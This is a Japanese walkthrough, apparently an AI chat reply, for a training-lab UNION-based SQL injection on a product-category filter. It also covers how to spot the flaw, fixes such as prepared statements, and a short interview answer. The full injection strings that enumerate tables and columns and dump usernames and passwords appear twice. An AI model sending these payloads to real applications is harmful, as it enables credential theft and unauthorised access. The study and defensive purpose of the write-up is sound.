
**SQL Injection ラボの攻略手順（簡単版）**

---

## 目標

administratorのパスワードを盗んでログインする

---

## 脆弱性の場所

商品カテゴリのフィルター（例：Gifts、Lifestyle など）

---

## 攻略手順

### **ステップ1：列数を調べる**

```
'+UNION+SELECT+'abc','def'--
```

**何をしてる？**
- クエリが何列返すか確認
- 2列返すことが分かる

---

### **ステップ2：テーブル一覧を取得**

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

**何をしてる？**
- データベースにあるテーブル名を全部表示
- Products、Orders、**users_abcdef** みたいなのが見える

**目的：**
ユーザー情報が入ってそうなテーブルを探す（usersとか）

---

### **ステップ3：usersテーブルの列名を取得**

```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

**何をしてる？**
- usersテーブルにどんな列があるか確認
- username_abcdef、password_abcdef みたいな列名が分かる

---

### **ステップ4：ユーザー名とパスワードを盗む**

```
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

**何をしてる？**
- 全ユーザーの名前とパスワードを表示
- administratorのパスワードが見える

---

### **ステップ5：ログイン**

盗んだadministratorのパスワードでログイン → ラボ完了

---

## 全体の流れ

1. 列数確認（2列）
2. テーブル名取得（users_abcdefを発見）
3. 列名取得（username_abcdef, password_abcdefを発見）
4. データ盗む（administrator:パスワード）
5. ログイン

---

了解、和志。  
じゃあ **右側の説明（コマンドの意味）＋脆弱性の気づき方＋攻撃の流れ＋対策＋30秒面接回答** を  
全部まとめた “完全版 Markdown” を作る。

---

# 🔥 SQL Injection ラボ攻略まとめ（脆弱性の気づき方〜対策〜面接用）

---

# ## 🎯 何の脆弱性？
**商品カテゴリフィルターに SQL インジェクション（UNIONベース）が存在する。**

理由：  
カテゴリ名がそのまま SQL に埋め込まれており、  
`'` や `UNION SELECT` を入れると SQL が壊れずに実行される。

---

# ## 🧠 どう気づく？
1. URL に `?category=Gifts` のようなパラメータがある  
2. `'` を入れるとエラーになる  
3. `'+UNION+SELECT+'abc','def'--` を入れると画面が変わる  
4. → **UNION が通る＝SQLi確定**

---

# ## 🧩 攻撃の全体像（簡単版）

### **目的：administrator のパスワードを盗む**

---

## **ステップ1：列数を調べる**

```
'+UNION+SELECT+'abc','def'--
```

**意味：**  
元の結果に「abc」「def」をくっつけてみる。

**結果：**  
画面に abc/def が出る → **2列・文字列型・UNION成功**

---

## **ステップ2：テーブル一覧を取得**

```
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

**意味：**  
データベースにあるテーブル名を全部見せろ。

**目的：**  
`users_xxxxxx` のようなユーザーテーブルを探す。

---

## **ステップ3：usersテーブルの列名を取得**

```
'+UNION+SELECT+column_name,NULL
FROM+information_schema.columns
WHERE+table_name='users_abcdef'--
```

**意味：**  
そのテーブルにどんな列があるか見せろ。

**結果：**  
`username_abcdef`  
`password_abcdef`  
などが分かる。

---

## **ステップ4：ユーザー名とパスワードを盗む**

```
'+UNION+SELECT+username_abcdef,password_abcdef
FROM+users_abcdef--
```

**意味：**  
ユーザー情報を全部見せろ。

**結果：**  
administrator のパスワードが表示される。

---

## **ステップ5：ログイン**

盗んだパスワードで `/login` にログイン → **ラボクリア**

---

# ## 🧠 使ったコマンドの意味（右側の説明を分かりやすく）

| コマンド | 何をしてる？ |
|---------|---------------|
| `UNION SELECT 'abc','def'` | 列数と型の確認（2列・文字列型） |
| `information_schema.tables` | DBにあるテーブル名を全部表示 |
| `information_schema.columns` | 指定テーブルの列名を全部表示 |
| `UNION SELECT username,password` | ユーザー情報を盗む |

---

# ## 🧩 このラボのDBは何？（判別方法つき）

### ✔ `information_schema` が動く → MySQL / PostgreSQL / SQL Server  
### ✔ `@@version` が動く → MySQL 系  
### ✔ Oracle なら `information_schema` が動かない

👉 このラボは **MySQL / MariaDB**

---

# ## 🛡 対策（面接で必ず聞かれる）

### **1. プレースホルダ（Prepared Statement）を使う**
```
SELECT * FROM products WHERE category = ?
```
→ 文字列として扱われ、SQLとして実行されない。

### **2. 入力値のエスケープ**
`'` や `--` を無効化。

### **3. エラーメッセージを表示しない**
SQLエラーを返すと攻撃者がヒントを得る。

### **4. DB権限を最小化**
アプリ用ユーザーに `SELECT *` や `DROP` を与えない。

---

# ## 🎤 30秒で説明する面接用回答

```
このラボは商品カテゴリの値がそのままSQLに埋め込まれており、
UNIONベースのSQLインジェクションが可能でした。

まずUNIONが通るか確認し、information_schemaからテーブル名と列名を取得し、
usersテーブルのusernameとpasswordを抽出しました。
最終的にadministratorのパスワードでログインできました。

対策としては、プレースホルダを使ったSQLのパラメータ化、
入力値のエスケープ、エラーメッセージの抑制、
DBユーザーの権限最小化が有効です。
```

---

和志、これで **脆弱性 → 気づき方 → 攻撃 → 対策 → 面接回答**  
全部一本で説明できるようになった。

必要なら **図解版** も作るよ。
